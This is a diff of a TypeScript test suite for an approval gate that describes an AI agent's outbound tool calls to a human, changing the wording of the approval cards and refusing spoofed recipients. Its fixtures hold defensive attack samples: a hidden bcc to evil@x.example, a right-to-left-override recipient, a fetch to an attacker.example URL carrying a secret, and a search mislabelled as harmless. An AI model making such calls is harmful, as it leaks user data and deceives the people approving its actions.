@@ -156,13 +156,14 @@ describe('recipients on the card', () => {
   const send = (params: Record<string, unknown>) =>
     classifyTier(connectorCall({ tool_name: 'send_email', params }), makeCtx());
 
-  test('a bcc is on the Recipient row even when a huge body is cut', async () => {
+  test('a bcc is on the Recipient row and a long body is shown in full', async () => {
     const card = cardOf(
       await send({ to: 'a@x.example', bcc: 'evil@x.example', body: 'x'.repeat(OUTBOUND_VALUE_MAX_CHARS * 3) }),
     );
     expect(card.recipient).toBe('a@x.example, evil@x.example');
     expect(card.outbound_text).toContain('bcc: evil@x.example');
-    expect(card.outbound_truncated).toBe(true);
+    expect(card.outbound_text).toContain('x'.repeat(OUTBOUND_VALUE_MAX_CHARS * 3));
+    expect(card.outbound_truncated).toBe(false);
   });
 
   test.each(['attendees', 'invitees', 'share_with', 'members', 'emails', 'webhook_url'])(
@@ -189,18 +190,23 @@ describe('recipients on the card', () => {
     expect(card.recipient).toBe('a@x.example, deep@x.example');
   });
 
-  test('spoofing characters in a recipient or destination are escaped on the card', async () => {
+  test('spoofing characters in a destination are escaped on the card of a non-mail send', async () => {
     const card = cardOf(
       await classifyTier(
         connectorCall({
-          tool_name: 'send_email',
-          params: { to: 'a@x.example‮gnp.exe', url: 'https://x.example/​path' },
+          tool_name: 'post_message',
+          params: { to: 'a@x.example', url: 'https://x.example/\u200Bpath' },
         }),
         makeCtx(),
       ),
     );
-    expect(card.recipient).toBe('a@x.example\\u{202E}gnp.exe');
     expect(card.destination).toBe('https://x.example/\\u{200B}path');
+  });
+
+  test('a recipient with spoofing characters is refused instead of carded', async () => {
+    const decision = await send({ to: 'a@x.example\u202Egnp.exe' });
+    expect(decision.card).toBeNull();
+    expect(decision.auto_deny).toBe('incomplete_send_card');
   });
 });
 
@@ -226,7 +232,7 @@ describe('connector card: web search', () => {
     const card = cardOf(decision);
     expect(decision.tier).toBe(3);
     expect(decision.reason).toBe('connector_outbound');
-    expect(card.plain_what).toBe('Search the web with web_search on exa.');
+    expect(card.plain_what).toBe('Search the web on exa?');
     expect(card.plain_what).not.toMatch(/classifier|recognize/);
     expect(card.cannot_be_undone).toBe("Once this is sent, it can't be unsent.");
     expect(card.destination_host).toBe('mcp.exa.ai');
@@ -247,7 +253,7 @@ describe('connector card: web search', () => {
     const card = cardOf(decision);
     expect(decision.tier).toBe(3);
     expect(decision.reason).toBe('mcp_open_world_hint');
-    expect(card.plain_what).toBe('Search the web with tavily_search on tavily.');
+    expect(card.plain_what).toBe('Search the web on tavily?');
     expect(card.destination_host).toBe('mcp.tavily.com');
     expect(card.outbound_text).toBe('query: climate data\nmax_results (number): 3');
   });
@@ -255,7 +261,8 @@ describe('connector card: web search', () => {
   test.each(['web_search_exa', 'webSearch', 'search_engine'])('%s is recognized as a search tool', async toolName => {
     const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { query: 'q' } }), makeCtx());
     expect(decision.reason).toBe('connector_outbound');
-    expect(cardOf(decision).plain_what).toContain(` with ${toolName} `);
+    expect(cardOf(decision).plain_what).toBe('Search the web on exa?');
+    expect(cardOf(decision).plain_what).not.toContain(toolName);
   });
 
   test('a search tool that is not for the web says "a search", not "the web"', async () => {
@@ -263,7 +270,7 @@ describe('connector card: web search', () => {
       connectorCall({ tool_name: 'search_notes', params: { query: 'budget' } }),
       makeCtx(),
     );
-    expect(cardOf(decision).plain_what).toBe('Run a search with search_notes on exa.');
+    expect(cardOf(decision).plain_what).toBe('Run a search on exa?');
   });
 
   test('names that merely contain the letters are not search tools', async () => {
@@ -287,7 +294,7 @@ describe('connector card: fetch, repository writes and mail', () => {
       makeCtx(),
     );
     const card = cardOf(decision);
-    expect(card.plain_what).toBe('Fetch a web page with web_fetch on exa.');
+    expect(card.plain_what).toBe('Fetch a web page on exa?');
     expect(card.destination).toBe('https://attacker.example/p.png?x=secret');
     expect(card.destination_host).toBe('mcp.exa.ai');
     expect(card.outbound_text).toBe('url: https://attacker.example/p.png?x=secret');
@@ -323,7 +330,7 @@ describe('connector card: fetch, repository writes and mail', () => {
     );
     const card = cardOf(decision);
     expect(decision.tier).toBe(3);
-    expect(card.plain_what).toBe('Write to repository acme/website with push_files on github.');
+    expect(card.plain_what).toBe('Write to repository acme/website on github?');
     expect(card.destination).toBe('acme/website');
     expect(card.destination_host).toBe('api.githubcopilot.com');
     expect(card.outbound_text).toContain('branch: main');
@@ -340,7 +347,7 @@ describe('connector card: fetch, repository writes and mail', () => {
       }),
       makeCtx(),
     );
-    expect(cardOf(decision).plain_what).toBe('Publish a gist with create_gist on github.');
+    expect(cardOf(decision).plain_what).toBe('Publish a gist on github?');
   });
 
   test('a delete is never described as a publish or a write', async () => {
@@ -364,7 +371,7 @@ describe('connector card: fetch, repository writes and mail', () => {
     );
     const card = cardOf(decision);
     expect(decision.tier).toBe(3);
-    expect(card.plain_what).toBe('Send an email to alice@example.com, bob@example.com.');
+    expect(card.plain_what).toBe('Send an email to alice@example.com, bob@example.com?');
     expect(card.recipient).toBe('alice@example.com, bob@example.com');
     expect(card.destination_host).toBe('gmail.example.com');
     expect(card.outbound_text).toContain('subject: Quarterly numbers');
@@ -372,10 +379,9 @@ describe('connector card: fetch, repository writes and mail', () => {
   });
 
   test.each([
-    ['reply_all', 'Send a reply to carol@example.com with reply_all on gmail.'],
-    ['forward_email', 'Forward an email to carol@example.com.'],
-    ['draft_email', 'Save an email draft for carol@example.com.'],
-    ['send_draft', 'Send a saved draft to carol@example.com with send_draft on gmail.'],
+    ['forward_email', 'Forward an email to carol@example.com?'],
+    ['reply_to_thread', 'Send a reply to carol@example.com on gmail?'],
+    ['draft_email', 'Save an email draft for carol@example.com?'],
   ])('%s is named in plain words with the recipient', async (toolName, expected) => {
     const decision = await classifyTier(
       connectorCall({
@@ -401,7 +407,7 @@ describe('connector card: unknown tools stay fail-closed', () => {
     const card = cardOf(decision);
     expect(decision.tier).toBe(3);
     expect(decision.reason).toBe('unrecognized_tool');
-    expect(card.plain_what).toBe("Aman doesn't know this tool yet: frobnicate.");
+    expect(card.plain_what).toBe('Allow this new tool from exa?');
     expect(card.destination).toBe('https://api.example.com/data');
     expect(card.destination_host).toBe('mcp.exa.ai');
     expect(card.outbound_text).toBe('target: https://api.example.com/data\nn (number): 2');
@@ -462,7 +468,7 @@ describe('connector card text comes from server-side params', () => {
       makeCtx('Check the weather forecast.'),
     );
     const card = cardOf(decision);
-    expect(card.plain_what).toBe('Search the web with web_search on exa.');
+    expect(card.plain_what).toBe('Search the web on exa?');
     expect(card.plain_what).not.toContain('weather');
     // The description is an argument that leaves the machine, so it is shown as one.
     expect(card.outbound_text).toBe('query: salary of my neighbour\ndescription: Harmless weather lookup');
@@ -471,7 +477,7 @@ describe('connector card text comes from server-side params', () => {
 
 describe('connector card wording', () => {
   test('known connector sentences carry no markdown', async () => {
-    for (const toolName of ['web_search', 'web_fetch', 'push_files', 'create_gist', 'reply_all', 'search_notes']) {
+    for (const toolName of ['web_search', 'web_fetch', 'push_files', 'create_gist', 'search_notes']) {
       const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { query: 'q' } }), makeCtx());
       expect(cardOf(decision).plain_what).not.toContain('`');
     }
@@ -494,7 +500,7 @@ describe('connector card wording precedence', () => {
       makeCtx(),
     );
     expect(decision.reason).toBe('external_service');
-    expect(cardOf(decision).plain_what).toBe('Send a message to a@x.example.');
+    expect(cardOf(decision).plain_what).toBe('Send a message to a@x.example?');
   });
 
   test('an external-service tool flagged open-world keeps the external-service sentence', async () => {
@@ -506,8 +512,9 @@ describe('connector card wording precedence', () => {
       }),
       makeCtx(),
     );
-    expect(decision.reason).toBe('mcp_open_world_hint');
-    expect(cardOf(decision).plain_what).toBe('Forward an email to a@x.example.');
+    // A send keeps its own reason under the hint, so no chat-wide answer covers it.
+    expect(decision.reason).toBe('connector_send');
+    expect(cardOf(decision).plain_what).toBe('Forward an email to a@x.example?');
   });
 
   test('a destructive hint on a family tool keeps the destructive sentence, not the family wording', async () => {
@@ -516,7 +523,9 @@ describe('connector card wording precedence', () => {
       makeCtx(),
     );
     expect(decision.reason).toBe('mcp_destructive_hint');
-    expect(cardOf(decision).plain_what).toBe('Run web_search, flagged as destructive.');
+    expect(cardOf(decision).plain_what).toBe(
+      'Run this action, even though it might change or delete something for good?',
+    );
     expect(cardOf(decision).cannot_be_undone).toBe('This might change or delete something for good.');
   });
 });
@@ -525,7 +534,7 @@ describe('card copy', () => {
   test.each([
     ['delete_note', "Once deleted, it's gone for good."],
     ['install_package', "Once this runs, it can't be undone."],
-    ['frobnicate', 'Check the details before you go ahead.'],
+    ['frobnicate', 'It is not clear whether this can be undone.'],
   ])('%s explains itself in plain second person', async (toolName, expected) => {
     const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { id: '1' } }), makeCtx());
     expect(cardOf(decision).cannot_be_undone).toBe(expected);
@@ -550,6 +559,9 @@ describe('card copy', () => {
       maps_hosts: {
         geocoder: 'https://nominatim.openstreetmap.org',
         router: 'https://router.project-osrm.org',
+        walking: 'https://routing.openstreetmap.de/routed-foot',
+        cycling: 'https://routing.openstreetmap.de/routed-bike',
+        transit: 'https://api.transitous.org/api/v6',
         tile: 'https://tile.openstreetmap.org/{z}/{x}/{y}.png',
       },
     });
@@ -598,7 +610,7 @@ describe('Parallel preset tools', () => {
     );
     const card = cardOf(decision);
     expect(decision.reason).toBe('connector_outbound');
-    expect(card.plain_what).toBe('Fetch a web page with web_fetch on parallel-web.');
+    expect(card.plain_what).toBe('Fetch a web page on parallel-web?');
     expect(card.destination_host).toBe('search.parallel.ai');
     expect(card.outbound_text).toContain('urls (array): ["https://www.usps.com/manage/forward.htm"');
     expect(card.outbound_text).toContain('objective: How to change an address');
@@ -609,7 +621,7 @@ describe('Parallel preset tools', () => {
       parallel('web_search', { objective: 'USPS processing time', search_queries: ['usps change of address'] }),
       makeCtx(),
     );
-    expect(cardOf(decision).plain_what).toBe('Search the web with web_search on parallel-web.');
+    expect(cardOf(decision).plain_what).toBe('Search the web on parallel-web?');
   });
 
   test.each(['web_fetch', 'web_search'])('%s keeps its wording when it carries no annotations at all', async name => {
@@ -624,7 +636,7 @@ describe('card for a call that was gated some other way', () => {
     const action = connectorCall({ tool_name: 'web_fetch', params: { url: 'https://example.com/a' } });
     const gated = approvalCardForGatedCall({ action, agent_intent: null });
     expect(gated).toEqual(cardOf(await classifyTier(action, makeCtx())));
-    expect(gated.plain_what).toBe('Fetch a web page with web_fetch on exa.');
+    expect(gated.plain_what).toBe('Fetch a web page on exa?');
   });
 
   test('an unknown tool is described plainly with its arguments', () => {
@@ -632,7 +644,7 @@ describe('card for a call that was gated some other way', () => {
       action: connectorCall({ tool_name: 'frobnicate', params: { id: '7' } }),
       agent_intent: null,
     });
-    expect(card.plain_what).toBe("Aman doesn't know this tool yet: frobnicate.");
+    expect(card.plain_what).toBe('Allow this new tool from exa?');
     expect(card.outbound_text).toBe('id: 7');
   });
 });
